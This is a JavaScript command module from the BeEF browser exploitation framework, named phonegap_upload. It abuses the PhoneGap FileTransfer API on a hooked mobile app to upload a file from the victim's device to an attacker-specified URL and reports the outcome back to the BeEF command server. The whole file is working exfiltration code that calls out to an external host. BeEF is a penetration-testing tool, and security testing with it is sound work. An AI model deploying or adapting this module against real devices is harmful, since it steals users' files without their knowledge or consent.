//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// phonegap_upload
//
beef.execute(function() {
    var result = 'unchanged';
    
    // TODO return result to beef
    function win(r) {
        //alert(r.response);
        result = 'success';
    }
   
    // TODO return result to beef
    function fail(error) {
        //alert('error! errocode =' + error.code);
        result = 'fail';
    }   

    // (ab)use phonegap api to upload file
    function beef_upload(file_path, upload_url) {

        var options = new FileUploadOptions();
        options.fileKey="content";

        // grab filename from the filepath 
        re = new RegExp("([^/]*)$");
        options.fileName = file_path.match(re)[0];
        //options.fileName="myrecording.wav";// TODO grab from filepath
        
        // needed?
        var params = new Object();
        params.value1 = "test";
        params.value2 = "param";
        options.params = params;
        // needed?
        
        var ft = new FileTransfer();
        ft.upload(file_path, upload_url, win, fail, options);
    }

    beef_upload('<%== @file_upload_src %>', '<%== @file_upload_dst %>');
    
    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result ); // move this to inside beef_upload
});
